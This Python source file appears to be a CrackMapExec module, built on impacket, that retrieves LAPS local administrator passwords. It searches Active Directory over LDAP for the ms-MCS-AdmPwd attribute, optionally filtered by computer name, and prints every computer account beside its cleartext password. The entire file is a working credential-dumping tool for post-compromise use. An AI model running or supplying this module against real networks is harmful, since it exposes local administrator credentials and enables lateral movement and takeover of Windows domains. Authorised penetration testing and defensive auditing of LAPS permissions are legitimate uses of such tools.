from impacket.ldap import ldapasn1 as ldapasn1_impacket

class CMEModule:
    '''
      Module by technobro refactored by @mpgn (now compatible with LDAP protocol + filter by computer)

      Initial module:
      @T3KX: https://github.com/T3KX/Crackmapexec-LAPS

      Credit: @n00py1
        Reference: https://www.n00py.io/2020/12/dumping-laps-passwords-from-linux/
        https://github.com/n00py/LAPSDumper
    '''

    name = 'laps'
    description = 'Retrieves the LAPS passwords'
    supported_protocols = ['ldap']
    opsec_safe = True
    multiple_hosts = False

    def options(self, context, module_options):
        """
            COMPUTER    Computer name or wildcard ex: WIN-S10, WIN-* etc. Default: *
        """

        self.computer = "*"
        if 'COMPUTER' in module_options:
            self.computer = module_options['COMPUTER']

    def on_login(self, context, connection):
     
        context.log.info('Getting LAPS Passwords')

        searchFilter = '(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(name='+ self.computer +'))'
        attributes = ['ms-MCS-AdmPwd','samAccountname']
        result = connection.search(searchFilter, attributes, 10000)

        for item in result:
            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                continue
            msMCSAdmPwd = ''
            sAMAccountName = ''
            for computer in item['attributes']:
                if str(computer['type']) == "sAMAccountName":
                    sAMAccountName = str(computer['vals'][0])
                else:
                    msMCSAdmPwd = str(computer['vals'][0])
            context.log.highlight("Computer: {:<20} Password: {}".format(sAMAccountName, msMCSAdmPwd))
